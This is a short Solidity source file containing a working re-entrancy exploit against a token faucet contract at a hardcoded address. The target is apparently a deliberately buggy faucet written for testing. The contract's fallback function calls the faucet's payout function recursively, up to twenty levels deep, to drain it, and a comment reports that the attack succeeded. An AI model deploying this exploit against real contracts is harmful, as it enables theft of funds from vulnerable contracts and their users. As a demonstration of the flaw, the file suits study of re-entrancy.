/*
yqq 2020-12-11

hack the faucet contract , re-entrancy attack
*/
pragma solidity ^0.4.20;

import "./htdf_faucet_with_bug.sol";

contract Hack {

    HtdfFaucet public faucet;
    uint256 public stackDepth = 0;
    address public addr;
    address public owner;
    uint8 MAX_DEPTH = 20;

    function Hack() public payable {
        addr = address(0xd4e2d4b954F02a6808eD7e47eAf2dF5cEEf466A4);
        faucet = HtdfFaucet(addr);
        owner = msg.sender;
    }

    // test pass, attack succeed!
    function  doHack() public {
        stackDepth = 0;
        faucet.getOneHtdf();
    }

    // fallback function
    function () external payable {
        stackDepth += 1;
        if(msg.sender.balance >= 100000000 && stackDepth <= MAX_DEPTH) {
            faucet.getOneHtdf();
        }
    }

}